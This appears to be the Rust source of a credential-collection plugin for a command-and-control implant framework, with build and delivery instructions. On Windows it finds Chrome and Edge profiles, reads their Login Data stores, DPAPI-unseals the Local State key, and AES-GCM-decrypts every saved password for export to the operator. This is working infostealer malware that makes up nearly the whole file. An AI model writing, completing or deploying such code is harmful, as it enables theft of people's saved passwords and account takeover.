//! The credential collection family's third module (architecture.md
//! Sec 5.4): `collect.browser`, the Chromium login stores -- one
//! discrete collection sweep whose halves stay honest about the
//! context they run in: the stores and the profile key belong to the
//! user the implant runs as, the decryption happens in this process's
//! memory, and both actions ride the task audit every dispatched
//! action already enters.
//!
//! The grammar gives one verb two actions -- `list` reports every
//! login the stores carry (origin, username, the profile it lives
//! in), `export` adds the password unsealed (the Local State key
//! DPAPI-fetched under the running user, the row AES-GCM-opened
//! through CNG; the legacy pre-v10 rows unseal as DPAPI blobs; the
//! app-bound v20 rows report named, not forced). The bare task is
//! `list` across both browsers: a read, never a write. Rows print in
//! the credential grammar the board parses, one JSON object per
//! line; a row that refuses decryption keeps its place with the note
//! naming why. A store-level failure -- locked file, malformed
//! database, absent key -- fails the task naming the store: an
//! export that quietly skipped half the sweep would mislead.
//!
//! Build for a Windows target (`cargo build --release --target
//! x86_64-pc-windows-gnu`), deliver the cdylib's bytes as a
//! `module.load browser` task's content, then task `collect.browser`
//! like any compiled verb. A non-Windows build compiles for the lane
//! and refuses the verb at run time: the technique has no stores to
//! open there.

mod arguments;
// The parser, codec, and store halves are pure and host-tested, but
// only the execution calls them -- the same not(windows) allowance
// the family's other pure halves carry, stated once at the module the
// whole tree of it belongs to.
#[cfg_attr(not(windows), allow(dead_code))]
mod base64;
#[cfg_attr(not(windows), allow(dead_code))]
mod sqlite;
#[cfg_attr(not(windows), allow(dead_code))]
mod stores;

use arguments::Arguments;
use rod_plugin_sdk::{rod_plugin, Plugin, Verb};

// The action the Windows dispatch matches on; off Windows the verb
// refuses before the name is ever spoken, and an unused import would be
// a build warning the lane turns into a failure.
#[cfg(windows)]
use arguments::Action;

pub struct Browser;

impl Plugin for Browser {
    fn name(&self) -> &'static str {
        "browser"
    }

    fn verbs(&self) -> Vec<Verb> {
        vec![Verb::new("collect.browser", browser_verb)]
    }
}

fn browser_verb(input: &str) -> Result<String, String> {
    let arguments = arguments::parse(input)?;
    execute(&arguments)
}

/// The Windows execution: the sweep the task named, over the stores
/// of the user the implant runs as.
#[cfg(windows)]
fn execute(arguments: &Arguments) -> Result<String, String> {
    let appdata = stores::local_appdata().map_err(|cause| format!("collect.browser: {cause}"))?;
    let mut lines: Vec<String> = Vec::new();
    for store in stores::scope_of(arguments.scope) {
        let root = format!(r"{appdata}\{}", store.user_data);
        if !stores::directory_exists(&root) {
            lines.push(format!("{}: no profile root -- not installed", store.name));
            continue;
        }
        let profiles: Vec<String> = stores::subdirectories(&root)
            .into_iter()
            .filter(|profile| stores::file_exists(&format!(r"{root}\{profile}\Login Data")))
            .collect();
        if profiles.is_empty() {
            lines.push(format!("{}: no profile carries a login store", store.name));
            continue;
        }
        // Export opens one key per browser: every profile under a User
        // Data root unseals against the one Local State beside it.
        let key = match arguments.action {
            Action::List => None,
            Action::Export => Some(load_key(store, &root)?),
        };
        for profile in &profiles {
            sweep_profile(store, profile, &root, key.as_ref(), &mut lines)?;
        }
    }
    Ok(lines.join("\n"))
}

/// The technique has no login stores off Windows; the manifest's
/// targets keep the module off other loads, and this refusal keeps a
/// stray dispatch honest about why it cannot run.
#[cfg(not(windows))]
fn execute(_arguments: &Arguments) -> Result<String, String> {
    Err(format!(
        "collect.browser: browser login stores are a Windows technique; this \
         build runs on {}",
        std::env::consts::OS
    ))
}

/// The browser's one AES-GCM key: Local State's os_crypt.encrypted_key
/// is base64 DPAPI text around the 32 bytes every v10 row opens with.
/// Every failure names the browser whose key refused.
#[cfg(windows)]
fn load_key(store: &stores::Store, root: &str) -> Result<stores::GcmKey, String> {
    let local_state = stores::read_file(&format!(r"{root}\Local State"))
        .map_err(|cause| format!("{}: Local State: {cause}", store.name))?;
    let text = String::from_utf8_lossy(&local_state);
    let encoded =
        stores::os_crypt_key(&text).map_err(|cause| format!("{}: {cause}", store.name))?;
    let blob = base64::decode(&encoded).map_err(|flaw| {
        format!(
            "{}: the Local State key is not valid base64: {flaw}",
            store.name
        )
    })?;
    const DPAPI_PREFIX: &[u8] = b"DPAPI";
    if blob.len() <= DPAPI_PREFIX.len() || &blob[..DPAPI_PREFIX.len()] != DPAPI_PREFIX {
        return Err(format!(
            "{}: the Local State key does not carry the DPAPI prefix",
            store.name
        ));
    }
    let key = stores::dpapi_unseal(&blob[DPAPI_PREFIX.len()..]).map_err(|status| {
        format!(
            "{}: the Local State key refused to unseal: {}",
            store.name,
            stores::dpapi_status_message(status)
        )
    })?;
    if key.len() != 32 {
        return Err(format!(
            "{}: the unsealed key is {} bytes, not the 32 an AES-256-GCM key carries",
            store.name,
            key.len()
        ));
    }
    stores::GcmKey::open(&key).map_err(|status| {
        format!(
            "{}: CNG refused the profile key: {}",
            store.name,
            stores::ntstatus_message(status)
        )
    })
}

/// One profile's logins as rows: the store's bytes read through the
/// hand-walked parse, the columns bound by name out of the schema the
/// file itself carries, and each password unsealed on export -- or its
/// refusal noted on the row it belongs to.
#[cfg(windows)]
fn sweep_profile(
    store: &stores::Store,
    profile: &str,
    root: &str,
    key: Option<&stores::GcmKey>,
    lines: &mut Vec<String>,
) -> Result<(), String> {
    let bytes = stores::read_file(&format!(r"{root}\{profile}\Login Data"))
        .map_err(|cause| format!("{} {profile}: Login Data: {cause}", store.name))?;
    let read = sqlite::read_table(&bytes, "logins")
        .map_err(|cause| format!("{} {profile}: {cause}", store.name))?;
    let (origin_at, username_at, password_at) =
        stores::login_columns(&stores::columns_of(&read.create_sql))
            .map_err(|cause| format!("{} {profile}: {cause}", store.name))?;

    for row in &read.rows {
        let origin = stores::text_of(row.get(origin_at));
        let username = stores::text_of(row.get(username_at));
        let password = stores::bytes_of(row.get(password_at));
        let (secret, note) = match (key, stores::sealed(&password)) {
            (None, _) => (None, None),
            (Some(_), Ok(stores::Sealed::Empty)) => (Some(String::new()), None),
            (Some(_), Ok(stores::Sealed::Legacy(blob))) => match stores::dpapi_unseal(blob) {
                Ok(plain) => rendered(&plain),
                Err(status) => (
                    None,
                    Some(format!(
                        "the password refused to unseal: {}",
                        stores::dpapi_status_message(status)
                    )),
                ),
            },
            (
                Some(key),
                Ok(stores::Sealed::Gcm {
                    nonce,
                    ciphertext,
                    tag,
                }),
            ) => {
                let nonce: &[u8; 12] = nonce.try_into().expect("sealed() cut a 12-byte nonce");
                let tag: &[u8; 16] = tag.try_into().expect("sealed() cut a 16-byte tag");
                match key.decrypt(nonce, ciphertext, tag) {
                    Ok(plain) => rendered(&plain),
                    Err(status) => (
                        None,
                        Some(format!(
                            "the password refused to open: {}",
                            stores::ntstatus_message(status)
                        )),
                    ),
                }
            }
            (Some(_), Ok(stores::Sealed::AppBound)) => (
                None,
                Some(
                    "app-bound (v20) sealed -- the elevation-service path this module's v1.0 \
                     does not carry"
                        .to_string(),
                ),
            ),
            (Some(_), Err(cause)) => (None, Some(cause)),
        };
        lines.push(stores::login_row(
            store.name,
            profile,
            &origin,
            &username,
            secret.as_deref(),
            note.as_deref(),
        ));
    }
    Ok(())
}

/// An unsealed password as its row prints it: text as itself, opaque
/// bytes as base64 with the note saying which it is.
#[cfg(windows)]
fn rendered(plain: &[u8]) -> (Option<String>, Option<String>) {
    let (secret, note) = stores::secret_of(plain);
    (Some(secret), note)
}

rod_plugin!(Browser);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_empty_task_is_the_read() {
        // The default action is list across both browsers: a bare task
        // reports and writes nothing -- on a non-Windows build it
        // refuses, naming why. Every sweep line names a browser, and
        // edge ships with the platform itself.
        #[cfg(windows)]
        {
            let output = browser_verb("").expect("the read runs");
            assert!(output.contains("edge"), "{output}");
        }
        #[cfg(not(windows))]
        {
            let refusal = browser_verb("").expect_err("off Windows the verb refuses");
            assert!(refusal.contains("Windows technique"), "{refusal}");
            assert!(refusal.contains(std::env::consts::OS), "{refusal}");
        }
    }

    #[test]
    fn a_bad_grammar_refuses_before_anything_runs() {
        assert!(browser_verb("dump").is_err());
        assert!(browser_verb("list firefox").is_err());
        assert!(browser_verb("list chrome extra").is_err());
        assert!(browser_verb("export browser=edge extra").is_err());
    }
}
